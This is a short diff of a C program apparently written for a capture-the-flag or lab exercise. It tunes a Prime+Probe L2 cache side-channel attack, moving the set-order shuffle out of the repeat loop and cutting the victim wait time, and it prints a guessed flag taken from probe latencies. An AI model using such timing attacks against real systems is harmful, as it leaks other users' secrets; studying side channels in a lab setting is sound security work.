@@ -72,14 +72,14 @@ int main() {
         uint64_t scores[NUM_L2_CACHE_SETS] = {0};
 
         
+        int perm[NUM_L2_CACHE_SETS];
+        for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
+                perm[i] = i;
+        }
+
+        shuffle(perm);
 
         for(int r = 0; r < REPEATS; r++) {
-
-            int perm[NUM_L2_CACHE_SETS];
-            for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
-                perm[i] = i;
-
-            shuffle(perm);
 
         /* PRIME all sets */
         for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
@@ -91,7 +91,7 @@ int main() {
         }
 
         /* let victim run */
-        wait_cycles(2000);
+        wait_cycles(1000);
 
         /* PROBE all sets */
         for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
@@ -108,7 +108,7 @@ int main() {
             scores[set] += (end - start);
             }
         }
-        
+
         int best_set = 0;
         uint64_t best_latency = 0;
 
@@ -124,7 +124,7 @@ int main() {
 
         printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
 
-        wait_cycles(2000);
+        wait_cycles(1000);
     }
 
     return 0;
